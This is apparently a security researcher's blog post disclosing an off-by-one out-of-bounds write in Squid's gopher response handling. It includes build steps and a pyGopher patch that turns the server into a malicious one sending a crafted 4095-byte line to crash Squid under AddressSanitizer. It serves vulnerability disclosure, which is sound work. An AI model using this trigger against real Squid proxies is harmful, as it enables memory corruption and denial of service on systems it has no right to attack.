---
layout: post
title:  "squid-cache proxy Out of Bound Write in Gopher"
date:   2019-09-27 08:00:00 +0800
categories: security
---

Earlier this year I was randomly reading the [squid source code][squidhome] on [github](https://github.com/squid-cache/squid/) and I saw a bug in the `gopherToHTML(GopherStateData * gopherState, char *inbuf, int len)` function.

`inbuf` is the untrusted response from a gopher server

When this response is processed, in the while loop, the first newline '\n' character is search with `memchr`.

the problem is if the '\n' is at exactly `inbuf[4095]` then later in the code `llen` will be 4095.

at this point squid will do a 

`line[llen + 1] = '\0';`

which is at index 4096, out of bound of the line buffer.

The buffer is of size 4096, so index 4096 is out of bound.

# How to trigger

Both version 4.8 stable and master are ok

```
# env is Ubuntu 18.04
wget http://www.squid-cache.org/Versions/v4/squid-4.8.tar.xz
tar xfv squid-4.8.tar.xz
cd squid-4.8
./configure --disable-shared CFLAGS="-fsanitize=address -ggdb" CXXFLAGS="-fsanitize=address -ggdb" LDFLAGS="-fsanitize=address"

make -j4
make install

git clone https://github.com/puckipedia/pyGopher.git

#patch pyGopher (we will use pyGopher as a malicious server)

===========
diff of the patch:
===========


diff --git a/config.py b/config.py
index 5687b6a..1ada112 100644
--- a/config.py
+++ b/config.py
@@ -12,8 +12,8 @@ class ExceptionEntry():
 		raise Exception("ExceptionEntry called!")
 
 class GopherConfig(gopher.DefaultConfig):
-	host = "83.84.127.137"
-	port = 7070
+	host = "127.0.0.1"
+	port = 70
 	default = "/"
 
 	def __init__(self):
diff --git a/gopher/getters.py b/gopher/getters.py
index a6c2765..6d7e8de 100644
--- a/gopher/getters.py
+++ b/gopher/getters.py
@@ -5,7 +5,8 @@ class Getter(object):
 		pass
 	
 	def output_data(self, socket, extra_info):
-		socket.sendall("\r\n.\r\n")
+		resp = 'A'*4094+'\n'+'\r\n.\r\n'
+		socket.sendall(resp.encode('utf-8'))
 
 	def set_default(self, host, port):
 		pass
@@ -20,10 +21,10 @@ class MenuGetter(Getter):
 		for item in self.menu_data:
 			item.set_default(host, port)
 
-	def output_data(self, socket, extra_info):
-		for item in self.menu_data:
-			socket.sendall(item.make_line())
-		socket.sendall(".\r\n".encode("utf-8"))
+#	def output_data(self, socket, extra_info):
+#		for item in self.menu_data:
+#			socket.sendall(item.make_line())
+#		socket.sendall(".\r\n".encode("utf-8"))
 
 class TextFileGetter(Getter):
 	file_path = ""
@@ -31,14 +32,14 @@ class TextFileGetter(Getter):
 	def __init__(self, path):
 		self.file_path = path
 
-	def output_data(self, socket, extra_info):
-		file = open(self.file_path, 'r')
-		for line in file:
-			if line[0] == ".":
-				socket.sendall(("."+line).encode("UTF-8"))
-			else:
-				socket.sendall(line.encode("UTF-8"))
-		socket.sendall("\r\n.\r\n".encode("UTF-8"))
+#	def output_data(self, socket, extra_info):
+#		file = open(self.file_path, 'r')
+#		for line in file:
+#			if line[0] == ".":
+#				socket.sendall(("."+line).encode("UTF-8"))
+#			else:
+#				socket.sendall(line.encode("UTF-8"))
+#		socket.sendall("\r\n.\r\n".encode("UTF-8"))
 
 class ExecutableGetter(Getter):
 	file_path = ""
@@ -48,28 +49,28 @@ class ExecutableGetter(Getter):
 		self.file_path = path
 		self.binary = is_binary
 
-	def output_data(self, socket, extra_data):
-		proc = Popen([self.file_path], stdout=PIPE)
-		stdout = proc.stdout
-
-		for line in stdout:
-			if line[0] == "." and not self.binary:
-				encoded_line = line.decode("UTF-8")
-				socket.sendall(("."+encoded_line).encode("UTF-8"))
-			else:
-				socket.sendall(line)
-		if not self.binary:
-			socket.sendall("\r\n.\r\n".encode("UTF-8"))
+#	def output_data(self, socket, extra_data):
+#		proc = Popen([self.file_path], stdout=PIPE)
+#		stdout = proc.stdout
+#
+#		for line in stdout:
+#			if line[0] == "." and not self.binary:
+#				encoded_line = line.decode("UTF-8")
+#				socket.sendall(("."+encoded_line).encode("UTF-8"))
+#			else:
+#				socket.sendall(line)
+#		if not self.binary:
+#			socket.sendall("\r\n.\r\n".encode("UTF-8"))
 class BinaryFileGetter(Getter):
 	file_path = ""
 
 	def __init__(self, path):
 		self.file_path = path
 
-	def output_data(self, socket, extra_info):
-		file = open(self.file_path, 'rb')
-		data = file.read(1024)
-		while len(data) > 0:
-			socket.sendall(data)
-			data = file.read(1024)
-
+#	def output_data(self, socket, extra_info):
+#		file = open(self.file_path, 'rb')
+#		data = file.read(1024)
+#		while len(data) > 0:
+#			socket.sendall(data)
+#			data = file.read(1024)
+#

# edit /etc/lynx/lynx.cfg to use squid as gopher proxy:
gopher_proxy:http://127.0.0.1:3128/


./src/squid -f src/squid.conf.default

# browse with lynx to gopher://127.0.0.1:70


```

in the squid window you will see the bug detected by address sanitizer:

![asan squid](/assets/squid_asan.png)

# Why you posted?

I shared the bug with squid devs the 25th of June, but I never got a official reply. 
Maybe someone else is interested in reading the report, or the bug, or how to trigger, or to patch it himself, since the patch seems not very hard.

I was interested in this hackerone program [https://hackerone.com/ibb-squid-cache](https://hackerone.com/ibb-squid-cache) but I doubt I will search for better bugs and try this program if the squid maintainer don't even reply (the hackerone bounty is only available AFTER you get it fixed in mainstream squid, but again if they don't reply, good luck).

[squidhome]: http://www.squid-cache.org/
